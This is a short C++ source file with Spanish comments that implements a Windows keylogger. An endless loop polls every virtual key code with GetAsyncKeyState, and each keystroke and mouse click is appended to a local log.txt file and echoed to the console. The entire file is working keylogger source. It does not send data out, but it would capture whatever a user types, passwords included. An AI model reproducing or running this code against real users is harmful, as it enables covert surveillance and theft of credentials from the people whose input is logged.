#include "Key.h"

using namespace std;

//iniciar lectura de teclado y mouse, tomando en cuenta los valores mínimo 0 y máximo 254(los cuales son los límites de todo teclado y mouse)
void Key::StartLogging() {
	while (true) {
		for (cKeys = 0; (int)cKeys <= 254; cKeys++) {
			if (GetAsyncKeyState((int)cKeys) & 0x1)
			{
				ConvertChar(SetKeys(cKeys));
			}
		}
	}
} 
//convertir char* puntero a char como texto para poder escribir en file log.txt.
void Key::ConvertChar(char* c) {
	ofstream log("log.txt", ios::app);
	if (!log.fail()) {
		log.flush();
		switch ((int)cKeys) {
		case VK_BACK:
			log << "[backspace]";
			cout << "[backspace]";
			break;
		case VK_RETURN:
			log << "[enter]";
			cout << "[enter]";
			break;
		case VK_SHIFT:
			log << "[shift]";
			cout << "[shift]";
			break;
		case VK_CONTROL:
			log << "[control]";
			cout << "[control]";
			break;
		case VK_CAPITAL:
			log << "[mayus]";
			cout << "[mayus]";
			break;
		case VK_TAB:
			log << "[tab]";
			cout << "[tab]";
			break;
		case VK_MENU:
			log << "[alt]";
			cout << "[alt]";
			break;
		case VK_LBUTTON:
			log << "[clic]";
			cout << "[clic]";
			break;
		case VK_RBUTTON:
			log << "[rclic]";
			cout << "[rclic]";
			break;
		case VK_SPACE:
			log << "[space]";
			cout << "[space]";
			break;
		case 4:
			log << "[mouse4]";
			cout << "[mouse4]";
			break;
		case 5:
			log << "[mouse5]";
			cout << "[mouse5]";
			break;
		case 6:
			log << "[mouse6]";
			cout << "[mouse6]";
			break;
		default:
			log << (char)cKeys;
			cout << (char)cKeys;
		}
		log.close();
	}
}